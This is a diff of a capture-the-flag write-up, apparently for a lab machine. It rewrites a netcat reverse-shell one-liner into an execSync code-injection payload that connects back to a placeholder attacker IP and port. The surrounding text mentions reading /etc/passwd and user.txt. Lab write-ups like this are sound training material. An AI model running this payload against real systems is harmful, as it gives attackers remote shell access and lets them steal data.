@@ -98,10 +98,10 @@ There exists a way to print `/etc/passwd`. Changing this to an email format and 
 
 Since we know this breakout works on this site we can now execute whatever we want! 
 
-We startup our classic nc listener and find a reverse shell script to insert:
+We startup our classic nc listener and find a reverse shell script to insert like so:
 
 ```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP YOURPORT >/tmp/f
+execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP YOURPORT >/tmp/f')\")()}}
 ```
 
 We catch this shell, navigate to `/home/david` and see the `user.txt` right there:
